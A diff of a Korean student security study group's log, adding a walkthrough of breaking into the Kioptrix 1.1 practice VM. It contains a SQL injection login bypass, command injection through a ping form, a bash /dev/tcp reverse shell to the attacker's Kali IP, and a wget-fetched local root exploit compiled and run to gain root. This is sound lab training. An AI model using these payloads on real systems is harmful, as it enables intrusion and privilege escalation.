@@ -3,5 +3,62 @@
 활동 요약: kioptrix 모의 해킹, dreamhack 등 자율 공부 및 공유
 참여자: 김채윤, 박기조, 배승원, 이효관, 임성주
 
-kioptrix level 1.1 
-1. 
+kioptrix 1.1 모의해킹
+1. 분석
+  vmware에 kioptrix 1.1(level 2) 설치
+  ifconfig->nmap -sn 192.168.0.0/24로 kioptrix 찾기 -> 192.168.0.17
+  nmap -A 192.168.0.17
+  -> apache 2.0.52(centos)
+
+2. web 확인
+  web에서 접근 192.168.0.17
+  로그인 창 확인됨
+  sql injection 시도
+  'or'1'='1
+  passwd = 'input'에서 
+  ''or'1'='1'이 된다
+  sql injection으로 administrative console로 접근
+  ping check이 가능하길래
+  8.8.8.8 -> 제대로 동작함
+  명령어를 이어서 하는 다중명령어로 injection 시도
+  8.8.8.8||ls -> index.php pingit.php
+  찾아보니 ;는 앞의 명령어의 성공여부와 관련없이 사용가능하다고 함
+  ;명령어 이런식으로 서칭해봄
+  id는 apache, 특이사항이 보이지 않음
+
+3. 취약점 분석
+  searchsploit centos를 하니 여러개의 취약점이 나온다
+  linuxkernel어쩌고 하는게 있어서
+  nmap결과를 보니 linux kernel 2.6 이다.
+  2.6에 맞는 exploit 9542.c가 있다
+  찾아보니 로컬 루트 권한 상승 exploit이고 
+  로우 계정이 있어야 하며 쉘 안에서 실행해야 한다고 한다
+
+4. 리버스 쉘
+  리버스 쉘이란 공격자 포트를 열어 대상에 명령어를 전달하고 결과를 받는 것
+  nc -lvp 리스닝상태로 특정 포트를 열고 기다리고 뭔가 오면 말해줄게
+  nc -lvp 2222
+  웹에서 ;bash -i >& /dev/tcp/192.168.0.16/2222 0>&1 #kali ip입력
+  -i interative 쉘 실행, stdin,stdout,stderr를 tcp/ip/port로 보내겠다
+  kali에서 쉘을 사용 가능하다
+
+5. exploit
+  이제 문제점은 파일을 어케 넘길것이냐는 건데
+  wget을 일반적으로 원격 쉘에서 파일 받을때 사용한다고 한다
+  apache를 이용한다고 하는데
+  sudo service apache2 start를 하면 apache서버가 local ip로 시작되고
+  내 칼리의 /var/www/html에 원격 접속이 가능하다
+  mv 9542.c /var/www/html 다운받은 9542.c를 옮긴다
+  우선 권한 문제가 있을 가능성 있기에
+  cd ../../../tmp 해주고
+  리버스 쉘에서 wget을 사용하자
+  wget 192.168.0.16/9542.c -> ls -> 9542.c
+  정상적으로 c파일을 다운받았다 사용하기위해 컴파일하자
+  gcc -o ex 9542.c
+  ex파일이 생성된다
+  ./ex를 하면
+  id -> uid(root) gid(root) 로 변경된다 
+
+피드백
+우선 리버스쉘 따는 것
+wget 사용하는 법을 처음 사용해봐서 어렵다
